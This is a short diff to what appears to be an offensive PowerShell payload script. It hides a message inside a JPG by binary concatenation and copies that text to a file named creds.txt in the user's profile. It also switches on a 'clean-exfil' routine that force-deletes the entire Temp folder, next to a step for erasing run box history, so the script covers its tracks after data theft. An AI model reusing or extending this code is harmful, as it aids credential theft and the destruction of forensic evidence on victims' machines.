@@ -203,7 +203,7 @@ $bmp.Save($filename)
 
 echo $hiddenMessage > $Env:temp\foo.txt
 cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"
-copy $Env:temp\foo.txt $Env:temp\oo.txt
+copy $Env:temp\foo.txt $Env:userprofile\creds.txt
 rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 
@@ -293,7 +293,7 @@ function clean-exfil {
 try {
 # Delete contents of Temp folder 
 
-#	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
